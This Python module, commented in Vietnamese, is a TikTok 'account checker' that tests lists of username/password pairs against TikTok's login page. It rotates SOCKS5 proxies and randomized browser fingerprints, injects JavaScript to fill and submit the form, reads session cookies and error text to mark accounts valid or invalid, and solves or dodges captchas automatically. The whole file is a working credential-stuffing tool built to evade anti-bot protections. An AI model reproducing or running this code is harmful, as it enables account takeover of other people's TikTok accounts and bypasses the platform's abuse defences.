"""
TikTok Account Checker Module - MunAntiBrowser Engine (Standard Verified)
Quy trình:
1. Tạo Clean Profile + Gán SOCKS5 Proxy từ danh sách.
2. Mở trang đăng nhập TikTok, điền user/pass bằng Native React Dispatch Event.
3. Bấm Submit và kiểm tra phản hồi:
   - Thấy Session Cookie / Redirect -> VALID (Sống / Đúng pass).
   - Thấy lỗi 'Account doesn't exist', 'Incorrect password', 'Maximum attempts' -> INVALID (Sai pass / Chết).
   - Thấy Captcha widget / Verify human -> BỎ QUA NGAY -> Đóng browser -> Đổi SOCKS5 mới + Profile sạch -> Retry lại.
"""

import asyncio
import os
import sys
import json
import logging
import random
from typing import Dict, Any, Optional, List, Tuple

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from mun_anti_browser.browser_manager import NodriverBrowserManager
from mun_anti_browser.profile_manager import ProfileManager

logger = logging.getLogger(__name__)


class TikTokChecker:
    def __init__(self, proxy_list: Optional[List[str]] = None, max_retries_on_captcha: int = 3):
        self.proxy_list = proxy_list or []
        self.max_retries = max_retries_on_captcha
        self.pm = ProfileManager()

    def _get_random_proxy(self) -> Tuple[str, str, str, str]:
        if not self.proxy_list:
            return "", "", "", ""
        raw_p = random.choice(self.proxy_list)
        parts = raw_p.split(":")
        if len(parts) == 4:
            return parts[0], parts[1], parts[2], parts[3]
        elif len(parts) == 2:
            return parts[0], parts[1], "", ""
        return "", "", "", ""

    async def check_single_account(self, username: str, password: str) -> Dict[str, Any]:
        attempts = 0
        while attempts < self.max_retries:
            attempts += 1
            ip, port, user, pwd = self._get_random_proxy()
            proxy_str = f"{ip}:{port}" if ip and port else ""

            profile = self.pm.create_random_profile(os_type="Window")

            manager = NodriverBrowserManager()
            try:
                browser, tab = await manager.start(
                    profile_config=profile,
                    proxy_string=proxy_str,
                    proxy_type="socks5",
                    proxy_username=user,
                    proxy_password=pwd,
                    headless=False,
                )

                await tab.get("https://www.tiktok.com/login/phone-or-email/email")
                await asyncio.sleep(6)

                # Trigger React Input Dispatch
                fill_script = f"""
                (() => {{
                    const usernameInput = document.querySelector('input[name="username"]') || document.querySelector('input[type="text"]');
                    const passwordInput = document.querySelector('input[type="password"]');

                    function setNativeValue(element, value) {{
                        const valueSetter = Object.getOwnPropertyDescriptor(element, 'value').set;
                        const prototype = Object.getPrototypeOf(element);
                        const prototypeValueSetter = Object.getOwnPropertyDescriptor(prototype, 'value').set;
                        if (prototypeValueSetter && valueSetter !== prototypeValueSetter) {{
                            prototypeValueSetter.call(element, value);
                        }} else if (valueSetter) {{
                            valueSetter.call(element, value);
                        }} else {{
                            element.value = value;
                        }}
                        element.dispatchEvent(new Event('input', {{ bubbles: true }}));
                        element.dispatchEvent(new Event('change', {{ bubbles: true }}));
                    }}

                    if (usernameInput && passwordInput) {{
                        usernameInput.focus();
                        setNativeValue(usernameInput, {json.dumps(username)});
                        passwordInput.focus();
                        setNativeValue(passwordInput, {json.dumps(password)});
                        return true;
                    }}
                    return false;
                }})()
                """
                filled = await tab.evaluate(fill_script)
                if not filled:
                    await manager.close()
                    continue

                await asyncio.sleep(1)
                # Submit
                await tab.evaluate("(() => { const b = document.querySelector('button[type=\"submit\"]'); if (b) b.click(); })()")

                # Đợi response (tối đa 4s)
                await asyncio.sleep(4)

                check_data = await tab.evaluate("""
                    (() => {
                        const url = window.location.href;
                        const hasSession = document.cookie.includes('sessionid');
                        const captchaEl = document.querySelector('#captcha-verify-image, .secsdk-captcha-drag-icon, .captcha_verify_container, [id*="captcha"], [class*="captcha"]');
                        
                        let errorMsg = '';
                        const errNodes = document.querySelectorAll('[class*="error"], [class*="Error"], [role="alert"], [class*="DivError"], span, p, div');
                        for (let el of errNodes) {
                            if (el.children.length > 0) continue; // Chỉ lấy leaf text node
                            const txt = el.innerText ? el.innerText.trim() : '';
                            if (txt && (txt.includes("doesn't exist") || txt.includes("Incorrect") || txt.includes("wrong password") || txt.includes("Maximum") || txt.includes("Invalid") || txt.includes("not registered"))) {
                                errorMsg = txt;
                                break;
                            }
                        }

                        return {
                            url: url,
                            has_session: hasSession,
                            has_captcha: !!captchaEl,
                            error: errorMsg
                        };
                    })()
                """)

                # evaluate() trong Nodriver trả về kiểu Dict hoặc list tuple tùy engine, cần normalize
                if isinstance(check_data, list):
                    check_data = {k: (v.get('value') if isinstance(v, dict) else v) for k, v in check_data}
                elif not isinstance(check_data, dict):
                    check_data = {}

                # Nếu dính Captcha và đã cấu hình SadCaptcha Solver -> Giải tự động
                if check_data.get("has_captcha"):
                    from sadcaptcha_solver import SadCaptchaSolver
                    solver = SadCaptchaSolver()
                    if solver.is_configured():
                        logger.info("[*] Phát hiện Captcha -> Đang tự động giải qua SadCaptcha API...")
                        solved = await solver.solve_and_drag(tab)
                        if solved:
                            await asyncio.sleep(3.0)
                            check_data = await tab.evaluate("""
                                (() => {
                                    const url = window.location.href;
                                    const hasSession = document.cookie.includes('sessionid');
                                    let errorMsg = '';
                                    const errNodes = document.querySelectorAll('[class*="error"], [class*="Error"], [role="alert"], span, p, div');
                                    for (let el of errNodes) {
                                        const txt = el.innerText ? el.innerText.trim() : '';
                                        if (txt && (txt.includes("doesn't exist") || txt.includes("Incorrect") || txt.includes("wrong password") || txt.includes("Maximum") || txt.includes("Invalid"))) {
                                            errorMsg = txt;
                                            break;
                                        }
                                    }
                                    return {
                                        url: url,
                                        has_session: hasSession,
                                        has_captcha: false,
                                        error: errorMsg
                                    };
                                })()
                            """)

                try:
                    await manager.close()
                except Exception:
                    pass

                # Phân loại
                if check_data.get("has_session") or "/login" not in check_data.get("url", ""):
                    return {
                        "status": "VALID",
                        "username": username,
                        "password": password,
                        "message": "Đăng nhập thành công",
                        "retries": attempts,
                    }

                if check_data.get("error"):
                    return {
                        "status": "INVALID",
                        "username": username,
                        "password": password,
                        "message": check_data.get("error"),
                        "retries": attempts,
                    }

                if check_data.get("has_captcha"):
                    logger.info(f"[*] Dính Captcha tại lần thử {attempts} -> Đổi SOCKS5 + Profile sạch...")
                    continue

            except Exception as e:
                try:
                    await manager.close()
                except Exception:
                    pass
                continue

        return {
            "status": "UNKNOWN",
            "username": username,
            "password": password,
            "message": f"Dính Captcha liên tục sau {self.max_retries} lần đổi Proxy",
            "retries": attempts,
        }
